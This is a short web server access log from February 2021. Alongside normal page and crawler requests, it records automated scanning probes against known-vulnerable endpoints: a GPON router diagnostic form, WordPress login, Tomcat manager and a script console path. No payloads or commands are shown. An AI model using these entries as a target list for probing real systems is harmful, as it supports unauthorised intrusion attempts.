193.29.13.47 - - [04/Feb/2021:20:45:28 +0000] "\x03" 400 0 "-" "-"
177.36.198.77 - - [04/Feb/2021:20:47:49 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
189.39.243.250 - - [04/Feb/2021:20:51:11 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.185.124.237 - - [04/Feb/2021:20:53:29 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:21:08:19 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
1.34.21.161 - - [04/Feb/2021:21:08:28 +0000] "GET / HTTP/1.1" 200 1580 "-" "Mozilla/5.0"
185.202.1.24 - - [04/Feb/2021:21:10:58 +0000] "\x03" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:21:17:45 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
157.55.39.14 - - [04/Feb/2021:21:39:16 +0000] "GET /robots.txt HTTP/1.1" 200 282 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
13.66.139.143 - - [04/Feb/2021:21:39:39 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
222.140.208.135 - - [04/Feb/2021:22:00:40 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 591 "-" "Hello, World"
5.39.64.29 - - [04/Feb/2021:22:03:04 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.29 - - [04/Feb/2021:22:03:17 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
205.185.124.237 - - [04/Feb/2021:22:12:51 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:22:16:19 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
184.72.194.148 - - [04/Feb/2021:22:22:22 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/52.0.3037.67 Safari/537.32"
209.141.51.62 - - [04/Feb/2021:22:43:21 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
192.95.30.65 - - [04/Feb/2021:22:57:03 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
192.95.30.65 - - [04/Feb/2021:22:57:21 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
103.42.179.202 - - [04/Feb/2021:22:57:31 +0000] "GET /login HTTP/1.0" 404 554 "-" "-"
103.42.179.202 - - [04/Feb/2021:22:57:32 +0000] "GET /manager/html/ HTTP/1.0" 404 554 "-" "-"
188.165.228.188 - - [04/Feb/2021:23:08:55 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
188.165.228.188 - - [04/Feb/2021:23:09:51 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
205.185.115.133 - - [04/Feb/2021:23:16:19 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:23:22:36 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.124.237 - - [04/Feb/2021:23:28:11 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
27.208.255.67 - - [04/Feb/2021:23:43:10 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 591 "-" "Hello, World"
172.105.77.209 - - [04/Feb/2021:23:55:57 +0000] "-" 408 0 "-" "-"
172.105.77.209 - - [04/Feb/2021:23:58:35 +0000] "-" 408 0 "-" "-"
128.14.134.134 - - [04/Feb/2021:23:59:20 +0000] "GET /login HTTP/1.1" 404 535 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
